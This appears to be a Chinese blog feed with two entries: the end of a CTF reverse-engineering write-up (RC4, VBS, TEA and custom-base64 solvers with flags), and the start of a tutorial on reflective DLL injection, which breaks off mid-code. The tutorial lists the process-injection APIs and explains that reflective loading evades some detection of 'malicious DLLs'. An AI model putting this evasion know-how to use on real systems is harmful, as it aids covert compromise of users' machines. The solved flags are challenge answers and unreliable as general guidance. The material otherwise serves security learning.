S[i],S[j]=S[j],S[i]</span><br><span class="line">  K=S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">  <span class="keyword">yield</span> K</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">N</span>(<span class="params">key,O</span>):</span><br><span class="line"> I=d(key)</span><br><span class="line"> S=G(g(<span class="number">256</span>))</span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> g(<span class="number">256</span>):</span><br><span class="line">  j=(j+S[i]+key[i%I])%<span class="number">256</span></span><br><span class="line">  S[i],S[j]=S[j],S[i]</span><br><span class="line"> z=l(S)</span><br><span class="line"> n=[]</span><br><span class="line"> <span class="keyword">for</span> k <span class="keyword">in</span> O:</span><br><span class="line">  n.append(k^s(z)+<span class="number">2</span>)</span><br><span class="line"> <span class="keyword">return</span> R(n)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">s,parts_num</span>):</span><br><span class="line"> Q=d(s.decode())</span><br><span class="line"> S=Q//parts_num</span><br><span class="line"> u=Q%parts_num</span><br><span class="line"> W=[]</span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> g(parts_num):</span><br><span class="line">  T=j+S</span><br><span class="line">  <span class="keyword">if</span> u&gt;<span class="number">0</span>:</span><br><span class="line">   T+=<span class="number">1</span></span><br><span class="line">   u-=<span class="number">1</span></span><br><span class="line">  W.append(s[j:T])</span><br><span class="line">  j=T</span><br><span class="line"> <span class="keyword">return</span> W</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> L=o(<span class="string">&#x27;input the flag: &gt;&gt;&gt; &#x27;</span>).encode()</span><br><span class="line"> <span class="keyword">assert</span> d(L)%<span class="number">2</span>==<span class="number">0</span>,<span class="string">&#x27;flag length should be even&#x27;</span></span><br><span class="line"> t=<span class="string">b&#x27;v3ry_s3cr3t_p@ssw0rd&#x27;</span></span><br><span class="line"> O=E(L,<span class="number">2</span>)</span><br><span class="line"> U=[]</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> O:</span><br><span class="line">  U.append(N(t,i).<span class="built_in">hex</span>())</span><br><span class="line"> <span class="keyword">if</span> U==[<span class="string">&#x27;1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60&#x27;</span>,2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a<span class="string">&#x27;]:</span></span><br><span class="line"><span class="string">  Y(&#x27;</span>Congratulations! You got the flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"> else:</span></span><br><span class="line"><span class="string">  Y(&#x27;</span>Wrong flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/09/DmEqGt8dscFrKgQ.png" alt="image-20241109172858511"></p><p>发现这里少了一个\‘,补上,然后看看感觉是RC4，所以直接把结果在调试的时候粘贴进去解出来得到</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">666</span><span class="keyword">c</span><span class="number">61677</span>b<span class="number">7468456e5</span>f<span class="number">495</span>f<span class="number">4361355</span>f<span class="number">42455</span>f<span class="number">596</span>f<span class="number">55525</span>f<span class="number">4</span>f<span class="number">6e6</span><span class="keyword">c</span><span class="number">375</span>f<span class="number">45786543557469366e5</span>f<span class="number">536</span>f<span class="number">5</span>f<span class="number">5573655</span>f<span class="number">6</span>d<span class="number">335</span>f<span class="number">74305</span>f<span class="number">52306e5</span>f<span class="number">744831375</span>f<span class="number">45783343757469306e7</span>d</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;thEn_I_Ca5_BE_YoUR_Onl7_ExeCUti6n_So_Use_m3_t0_R0n_tH17_Ex3Cuti0n&#125;</span></span><br></pre></td></tr></table></figure><h3 id="joyVBS"><a href="#joyVBS" class="headerlink" title="joyVBS"></a>joyVBS</h3><p>和上一个题的思路</p><p>开头添加</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim fso, <span class="keyword">file</span></span><br><span class="line"><span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> <span class="keyword">file</span> = fso.CreateTextFile(<span class="string">&quot;output.txt&quot;</span>, <span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>改为file.Write</p><p>得到文件</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;VBScript, often abbreviated as VBS, is an event-driven programming language developed by Microsoft, primarily used for scripting in the Windows environment.&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;It is based on the Visual Basic programming language and is designed to be simple and easy to use, especially for those familiar with the BASIC programming language.&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;And for me, it is the first programming language that I&#x27;ve leart&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;Hackers! Have fun with this VBS challenge!&quot;</span></span><br><span class="line">flag = <span class="built_in">InputBox</span>(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;Hack for fun&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;NalvN3hKExBtALBtInPtNHTnKJ80L3JtqxTboRA/MbF3LnT0L2zHL2SlqnPtJLAnFbIlL2SnFT8lpzFzA2JHrRTiNmT9&quot;</span></span><br><span class="line"></span><br><span class="line">qwfe = <span class="number">9</span>+<span class="number">2</span>+<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> Base64Decode(base64EncodedString)</span><br><span class="line">    <span class="keyword">Dim</span> xml, elem</span><br><span class="line">    <span class="keyword">Set</span> xml = <span class="built_in">CreateObject</span>(<span class="string">&quot;MSXML2.DOMDocument&quot;</span>)</span><br><span class="line">    <span class="keyword">Set</span> elem = xml.createElement(<span class="string">&quot;tmp&quot;</span>)</span><br><span class="line">    elem.dataType = <span class="string">&quot;bin.base64&quot;</span> </span><br><span class="line">    elem.text = base64EncodedString </span><br><span class="line">    <span class="keyword">Dim</span> stream</span><br><span class="line">    <span class="keyword">Set</span> stream = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">    stream.Type = <span class="number">1</span> <span class="comment">&#x27;Binary</span></span><br><span class="line">    stream.Open</span><br><span class="line">    stream.Write elem.nodeTypedValue </span><br><span class="line">    stream.Position = <span class="number">0</span></span><br><span class="line">    stream.Type = <span class="number">2</span> <span class="comment">&#x27;Text</span></span><br><span class="line">    stream.Charset = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">    Base64Decode = stream.ReadText</span><br><span class="line">    stream.Close</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"><span class="keyword">Function</span> Caesar(str,offset)</span><br><span class="line"><span class="keyword">Dim</span> length,char,i</span><br><span class="line">Caesar = <span class="string">&quot;&quot;</span></span><br><span class="line">length = <span class="built_in">Len</span>(str)</span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> length</span><br><span class="line">char = <span class="built_in">Mid</span>(str,i,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">If</span> char &gt;= <span class="string">&quot;A&quot;</span> <span class="keyword">And</span> char &lt;= <span class="string">&quot;Z&quot;</span> <span class="keyword">Then</span></span><br><span class="line">char = <span class="built_in">Asc</span>(<span class="string">&quot;A&quot;</span>) + (<span class="built_in">Asc</span>(char) - <span class="built_in">Asc</span>(<span class="string">&quot;A&quot;</span>) + offset) Mod <span class="number">26</span></span><br><span class="line">Caesar = Caesar &amp; <span class="built_in">Chr</span>(char)</span><br><span class="line"><span class="keyword">ElseIf</span> char &gt;= <span class="string">&quot;a&quot;</span> <span class="keyword">And</span> char &lt;= <span class="string">&quot;z&quot;</span> <span class="keyword">Then</span></span><br><span class="line">char = <span class="built_in">Asc</span>(<span class="string">&quot;a&quot;</span>) + (<span class="built_in">Asc</span>(char) - <span class="built_in">Asc</span>(<span class="string">&quot;a&quot;</span>) + offset) Mod <span class="number">26</span></span><br><span class="line">Caesar = Caesar &amp; <span class="built_in">Chr</span>(char)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">Caesar = Caesar &amp; char</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> flag = Base64Decode(Caesar(wefbuwiue, <span class="number">26</span>-qwfe)) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct  FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure><p>尝试直接输出Base64Decode</p><p><img src="https://s2.loli.net/2024/11/09/6BCL3jP7U4QIdNV.png" alt="image-20241109173144980"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;VB3_1s_S0_e1sY_4_u_r1gh3?btw_1t_iS_a1s0_Us3Fu1_a3D_1nTe3eSt1ng!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="re5"><a href="#re5" class="headerlink" title="re5"></a>re5</h3><p>调试可以看出，每次的SEH都使用rand()修改了delta，</p><p><img src="https://s2.loli.net/2024/11/09/owkBQxFVCJLnyUp.png" alt="image-20241109173349124"></p><p>这里可以看到srand初始化是0，那么直接输出每次的delta即可，同时key不是1234而是2233很怪不知道为什么</p><p>然后直接写脚本解即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta[] = &#123; <span class="number">0x26</span>, <span class="number">0x1e27</span>, <span class="number">0x52f6</span>, <span class="number">0x985</span>, <span class="number">0x2297</span>, <span class="number">0x2e15</span>, <span class="number">0x20ad</span>, <span class="number">0x7e1d</span>, <span class="number">0x28d2</span>, <span class="number">0x7794</span>, <span class="number">0x16dd</span>, <span class="number">0x6dc4</span>, <span class="number">0x476</span>, <span class="number">0x119</span>, <span class="number">0x5039</span>, <span class="number">0x3e31</span>, <span class="number">0x22f1</span>, <span class="number">0x66ad</span>, <span class="number">0xbb5</span>, <span class="number">0x3958</span>, <span class="number">0x51f0</span>, <span class="number">0x7c93</span>, <span class="number">0x5497</span>, <span class="number">0x6532</span>, <span class="number">0x4819</span>, <span class="number">0x52b</span>, <span class="number">0x70d1</span>, <span class="number">0x8c0</span>, <span class="number">0x25fd</span>, <span class="number">0x7e16</span>, <span class="number">0x98e</span>, <span class="number">0x24e</span>, <span class="number">0x348</span>, <span class="number">0x489b</span>, <span class="number">0x420b</span>, <span class="number">0x52f5</span>, <span class="number">0x5c3b</span>, <span class="number">0x3149</span>, <span class="number">0x30a8</span>, <span class="number">0x363</span>, <span class="number">0x735d</span>, <span class="number">0x1ade</span>, <span class="number">0x6e3f</span>, <span class="number">0x45df</span>, <span class="number">0x7b6d</span>, <span class="number">0x5068</span>, <span class="number">0x2fb4</span>, <span class="number">0x7987</span>, <span class="number">0x1d9a</span>, <span class="number">0x42aa</span>, <span class="number">0x1dcd</span>, <span class="number">0x72dc</span>, <span class="number">0x2ff7</span>, <span class="number">0x34c1</span>, <span class="number">0x5f44</span>, <span class="number">0x2d81</span>, <span class="number">0x3029</span>, <span class="number">0x1c08</span>, <span class="number">0x91b</span>, <span class="number">0x4b40</span>, <span class="number">0x5662</span>, <span class="number">0x3738</span>, <span class="number">0x6930</span>, <span class="number">0x44e</span>, <span class="number">0x5494</span>, <span class="number">0x20d4</span>, <span class="number">0x5f11</span>, <span class="number">0x6cd0</span>, <span class="number">0x15de</span>, <span class="number">0x60c4</span>, <span class="number">0x3711</span>, <span class="number">0x339d</span>, <span class="number">0x124b</span>, <span class="number">0x413f</span>, <span class="number">0x3b9c</span>, <span class="number">0x3e46</span>, <span class="number">0xabb</span>, <span class="number">0x6aef</span>, <span class="number">0x70c7</span>, <span class="number">0x4654</span>, <span class="number">0x4121</span>, <span class="number">0xc50</span>, <span class="number">0x2e2b</span>, <span class="number">0x5bd0</span>, <span class="number">0xef</span>, <span class="number">0x105a</span>, <span class="number">0xaf4</span>, <span class="number">0x7109</span>, <span class="number">0xbcf</span>, <span class="number">0x285f</span>, <span class="number">0x5035</span>, <span class="number">0x5391</span>, <span class="number">0x3e94</span>, <span class="number">0x2d36</span>, <span class="number">0x657f</span>, <span class="number">0x3689</span>, <span class="number">0x270</span>, <span class="number">0x1b99</span>, <span class="number">0x6bb1</span>, <span class="number">0x321e</span>, <span class="number">0x5e67</span>, <span class="number">0x2fcc</span>, <span class="number">0x7a11</span>, <span class="number">0x5c54</span>, <span class="number">0x3d03</span>, <span class="number">0x647f</span>, <span class="number">0x319c</span>, <span class="number">0x5f03</span>, <span class="number">0x3a4a</span>, <span class="number">0x58f6</span>, <span class="number">0x1a9b</span>, <span class="number">0x2f1e</span>, <span class="number">0xded</span>, <span class="number">0x6267</span>, <span class="number">0x77</span>, <span class="number">0x493b</span>, <span class="number">0x65c2</span>, <span class="number">0x4ca4</span>, <span class="number">0x3fce</span>, <span class="number">0x1750</span>, <span class="number">0x4474</span>, <span class="number">0xdf9</span>, <span class="number">0x3ac6</span>, <span class="number">0x63bb</span>, <span class="number">0x387a</span>, <span class="number">0x7258</span>, <span class="number">0x67a2</span>, <span class="number">0x7d86</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum[] = &#123; <span class="number">0x6f0f9</span>, <span class="number">0x7d7e9</span>, <span class="number">0x76142</span>, <span class="number">0x873fc</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TEA_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span>* k)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta = <span class="number">0x61C88647</span>, sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">delta = rand();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x, &quot;</span>, delta);</span><br><span class="line">sum += delta;</span><br><span class="line">v0 += (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (sum + v1) ^ (k[<span class="number">0</span>] + (v1 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">v1 += (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (sum + v0) ^ (k[<span class="number">2</span>] + (v0 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TEA_decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* v, <span class="type">int</span>* k, <span class="type">int</span> round)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt; <span class="number">-1</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">v1 -= (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (sum[round] + v0) ^ (k[<span class="number">2</span>] + (v0 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">v0 -= (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (sum[round] + v1) ^ (k[<span class="number">0</span>] + (v1 &lt;&lt; <span class="number">4</span>));</span><br><span class="line">sum[round] -= delta[round * <span class="number">32</span> + i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">srand(<span class="number">0</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> last[<span class="number">9</span>] = &#123;</span><br><span class="line"><span class="number">0xEA2063F8</span>, <span class="number">0x8F66F252</span>, <span class="number">0x902A72EF</span>, <span class="number">0x411FDA74</span>, <span class="number">0x19590D4D</span>, <span class="number">0xCAE74317</span>, <span class="number">0x63870F3F</span>, <span class="number">0xD753AE61</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> key[<span class="number">4</span>] = &#123; <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 8; i += 2)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//TEA_encrypt(&amp;last[i], key);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> round = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">6</span>; i &gt; <span class="number">-1</span>; i -= <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">TEA_decrypt(&amp;last[i], key, round);</span><br><span class="line">round--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nDecrypted values:\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%X 0x%X\n&quot;</span>, last[i], last[i + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>*)last);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d<span class="number">555</span>ce<span class="number">75</span>ec<span class="number">293</span><span class="keyword">c</span><span class="number">8</span>ed<span class="number">232</span>d<span class="number">83</span>dffb<span class="number">0</span>ff<span class="number">82</span></span><br></pre></td></tr></table></figure><h3 id="Rafflesia"><a href="#Rafflesia" class="headerlink" title="Rafflesia"></a>Rafflesia</h3><p>main里面有花，去了，然后看到tls里有反调，改跳转跳过</p><p><img src="https://s2.loli.net/2024/11/09/Y6K7bgpdWO32ANG.png" alt="image-20241109175055679"></p><p>这个花不会去，但是大概能看懂</p><p>好像就是一个base64变表</p><p>直接调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HElRNYGmBOMWnbDvUCgcpu1QdPqJIS+iTry39KXse4jLh/x26Ff5Z7Vokt8wzAa0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">last = <span class="string">b&#x27;H@^jHwpsH)[jH&#123;M/\\tBBK_|-O&#123;W.iJZ7\\)|~zaB^H+Lwv&#123;SS|-j@\\_[Y&#x27;</span></span><br><span class="line">last = xor(last,<span class="number">0x18</span>).decode()</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">table = <span class="string">&#x27;HElRNYGmBOMWnbDvUCgcpu1QdPqJIS+iTry39KXse4jLh/x26Ff5Z7Vokt8wzAa0&#x27;</span></span><br><span class="line">otable = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> last:</span><br><span class="line">    result += otable[table.index(ch)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((b64decode(result)))</span><br><span class="line"><span class="comment"># flag&#123;8edae458-4tf3-2ph2-9f26-1f8719ec8f8d&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">之前忘发了，今天补上</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    <category term="CTF" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/CTF/"/>
    
    <category term="比赛" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/CTF/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>DLL反射注入</title>
    <link href="https://www.pri87.vip/posts/76312a14.html"/>
    <id>https://www.pri87.vip/posts/76312a14.html</id>
    <published>2024-12-21T11:30:03.000Z</published>
    <updated>2024-12-24T17:21:20.312Z</updated>
    
    <content type="html"><![CDATA[<h2 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h2><p>之前最普通的方法是创建远程线程注入DLL，具体流程是<br>注入器找到目标进程句柄，申请一段内存，写入DLL路径，然后创建远程线程，将LoadLibrary作为函数指针传入，把DLL路径作为参数进行执行，从而加载我们的恶意DLL</p><p>需要的WindowsAPI如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CreateToolhelp32Snapshot();//枚举进程,然后比较进程名pe.szExeFile和已知字符串获取句柄</span></span><br><span class="line">OpenProcess();<span class="comment">//通过pid获取句柄</span></span><br><span class="line"></span><br><span class="line">VirtualAllocEx();<span class="comment">//申请空间</span></span><br><span class="line">WriteProcessMemory();<span class="comment">//写入字符串</span></span><br><span class="line">CreatRemoteThread();<span class="comment">//创建线程</span></span><br><span class="line"></span><br><span class="line">LoadLibrary();<span class="comment">//装载DLL</span></span><br></pre></td></tr></table></figure><h2 id="反射型DLL注入"><a href="#反射型DLL注入" class="headerlink" title="反射型DLL注入"></a>反射型DLL注入</h2><p>它和上面的注入方式不一样的地方在于我们不使用LoadLibrary函数去装载DLL，它没有向操作系统注册本身，从一定程度上规避了部分检测。</p><p>流程：</p><p>注入器找到目标进程句柄，申请一段内存写入DLL文件，DLL文件中有自展开代码，通过导出表找到自展开代码，注入器创建远程线程执行自展开代码。加载完毕，跳转到DLLmain执行逻辑。</p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>这里要注意一个地方：<br>如果现在本身空间展开，然后复制到目标进程，那么会导致基地址不对，进而导致重定位表修复失效，与此同时，修复的模块的导入表也对不上，所以需要在目标进程中修复。</p><p>但是如果执行了loadLibrary那就和普通的远程线程注入一样了，所以只能递归调用我们写的LoadLibrary?<br>有什么方法可以避免吗？基地址可以通过在目标进程分配好空间之后来固定在loader中的内存地址来实现，然后系统DLL的函数地址肯定是固定的，所以只要没有使用额外的DLL，也可以直接在主内存展开后再复制过去。</p><p>同时，在加载的时候，如果不是把展开写在DLL里面，就要在DLL里面写一个导出函数，用它去执行dllmain，否则createremotethread函数不支持多参数进程，不能直接调用。所以要写遍历导入表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>导入表结构，通过同时遍历AddressOfFunctions，AddressOfNames和AddressOfNameOrdinals查找对应偏移地址。其中函数名和序号数组是同步的，对应位置的函数名对应对应的序号。</p><p>需要的WindowsAPI如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//CreateToolhelp32Snapshot();//枚举进程,然后比较进程名pe.szExeFile和已知字符串获取句柄</span></span><br><span class="line">OpenProcess();<span class="comment">//通过pid获取句柄</span></span><br><span class="line"></span><br><span 